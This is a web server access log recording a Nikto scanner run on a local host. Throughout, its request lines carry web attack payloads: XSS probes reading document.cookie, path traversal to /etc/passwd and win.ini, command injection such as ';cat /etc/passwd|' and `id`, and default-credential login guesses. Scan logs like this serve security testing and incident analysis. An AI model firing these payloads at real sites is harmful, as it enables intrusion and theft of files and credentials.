172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /doc/packages/ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003004)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /image/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003005)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /javax/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003006)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /perl/ HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003007)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/ HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003008)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /SUNWmc/htdocs/en_US/ HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003009)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search/inc/ HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003010)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /images/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003011)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /docs/ HTTP/1.1" 200 1363 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003012)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examples/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003013)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /style/ HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003014)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /styles/ HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003015)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&what=\\\">\\\"<script>javascript:alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003016)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search.asp?Search=\\\">&lt;script&gt;alert(Vulnerable)&lt;/script&gt; HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003017)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /uploader.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003018)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/Winmsdp.exe?Source=/IISSAMPLES/%c0%ae%c0%ae/%c0%ae%c0%ae/bogus_directory/nonexistent.asp HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003019)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/Winmsdp.exe HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003020)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/sdk/asp/docs/Winmsdp.exe?Source=/IISSAMPLES/%c0%ae%c0%ae/default.asp HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003021)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/howitworks/Winmsdp.exe HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003022)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003023)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003024)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /conspass.chl+ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003025)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /consport.chl+ HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003026)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /general.chl+ HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003027)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /srvstatus.chl+ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003028)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003029)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /firewall/policy/dlg?q=-1&fzone=t<script>alert('Vulnerable')</script>>&tzone=dmz HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003030)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('Vulnerable')</script> HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003031)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0 HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003032)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /antispam/listdel?file=whitelist&name=a<script>alert('Vulnerable')</script>&startline=0(naturally) HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003033)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter,/system/status/session HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003034)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\\\"><script>alert('Vulnerable')</script>,/system/status/session HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003035)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /theme1/selector?button=status,monitor,session&button_url=/system/status/status\\\"><script>alert('Vulnerable')</script>,/system/status/moniter,/system/status/session HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003036)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /theme1/selector?button=status,monitor,session\\\"><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003037)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /search.asp?Search= HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003038)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003039)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22 HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003040)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003041)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003042)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003043)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/ HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003045)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /NULL.printer HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003047)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nul..cfm HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003048)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nul..dbm HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003049)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nul.cfm HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003050)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /nul.dbm HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003051)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mlog.html HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003057)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mlog.phtml HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003058)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mylog.html?screen=/etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003059)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mylog.phtml?screen=/etc/passwd HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003060)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/mlog.html HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003061)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/mlog.phtml HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003062)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/mylog.html?screen=/etc/passwd HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003063)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /php/mylog.phtml?screen=/etc/passwd HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003064)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET fi?/etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003065)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cfide/administrator/index.cfm HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003066)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003067)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /cfide/administrator/index.cfm HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003068)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003069)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /directory.php?dir=%3Bcat%20/etc/passwd HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003070)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /content/base/build/explorer/none.php?..:..:..:..:..:..:..:etc:passwd: HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003071)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /content/base/build/explorer/none.php?/etc/passwd HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003072)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /soapConfig.xml HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003073)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /postnuke/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /postnuke/html/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /modules/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpBB/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /forum/bbcode_ref.php?user=MToxOjE6MToxOjE6MToxOjE6Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAK HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003075)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /GW5/GWWEB.EXE?HELP=bad-request HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003077)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /GWWEB.EXE?HELP=bad-request HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003078)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /examplesWebApp/InteractiveQuery.jsp?person=<script>alert('Vulnerable')</script> HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003081)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /XSQLConfig.xml HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003082)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /sgdynamo.exe?HTNAME=<script>alert('Vulnerable')</script> HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003083)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /docs/<script>alert('Vulnerable');</script> HTTP/1.1" 404 545 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003084)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /docs/NED?action=retrieve&location=. HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003085)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /aktivate/cgi-bin/catgy.cgi?key=0&cartname=axa200135022551089&desc=<script>alert('Vulnerable')</script> HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003086)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /lcgi/ndsobj.nlm HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003087)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /surf/scwebusers HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003088)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_vti_bin/fpcount.exe HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003089)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/form_results.htm HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003090)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/form_results.html HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003091)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /_private/form_results.txt HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003092)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /scripts/tools/getdrvrs.exe HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003093)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "OPTIONS // HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003097)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/normal_html.cgi?file=../../../../../../etc/issue%00 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003098)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/normal_html.cgi?file=;cat%20/etc/passwd| HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003099)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/normal_html.cgi?file=|cat%20/etc/passwd| HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003100)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/member_html.cgi?file=;cat%20/etc/passwd| HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003101)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /shop/member_html.cgi?file=|cat%20/etc/passwd| HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003102)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /boilerplate.asp?NFuse_Template=.../.../.../.../.../.../.../.../.../boot.ini&NFuse_CurrentFolder=/ HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003104)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /proxy/ssllogin?user=administrator&password=administrator HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003105)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /proxy/ssllogin?user=administrator&password=operator HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003106)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /proxy/ssllogin?user=administrator&password=user HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003107)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /project/index.php?m=projects&user_cookie=1 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003116)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcalendar/colors.php?color=</script><script>alert(document.cookie)</script> HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003117)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /webcalendar/week.php?user=\\\"><script>alert(document.cookie)</script> HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003118)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /active.log HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003119)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /?pattern=/etc/*&sort=name HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003120)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /images/?pattern=/etc/*&sort=name HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003121)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /debug/dbg?host==<script>alert('Vulnerable');</script> HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003122)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /debug/echo?name=<script>alert('Vulnerable');</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003123)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /debug/errorInfo?title===<script>alert('Vulnerable');</script> HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003124)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /debug/showproc?proc===<script>alert('Vulnerable');</script> HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003125)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /site/eg/source.asp HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003126)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /3rdparty/phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003127)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpMyAdmin/export.php?what=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003127)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /3rdparty/phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003127)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /phpmyadmin/export.php?what=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003127)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /pma/export.php?what=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003127)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /~nobody/etc/passwd HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003128)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "POST /admin/db.php HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003129)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /admin/db.php?dump_sql=1 HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003130)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /dcforum/dcforum.cgi?az=list&forum=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003131)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /%00/ HTTP/1.1" 404 491 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003133)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /iissamples/exair/search/advsearch.asp HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003134)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /isqlplus HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003135)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /data/member_log.txt HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003136)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /data/userlog/log.txt HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003137)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /userlog.php HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003138)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /internal.sws?../../../../../../../../winnt/win.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003139)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /internal.sws?../../../../../../../../winnt/win.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003140)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003141)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /internal.sws?.../.../.../.../.../.../.../.../winnt/win.ini HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003142)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /ASP/cart/database/metacart.mdb HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003143)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /database/metacart.mdb HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003144)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /mcartfree/database/metacart.mdb HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003145)"
172.17.0.1 - - [12/Feb/2019:08:08:29 +0000] "GET /metacart/database/metacart.mdb HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003146)"
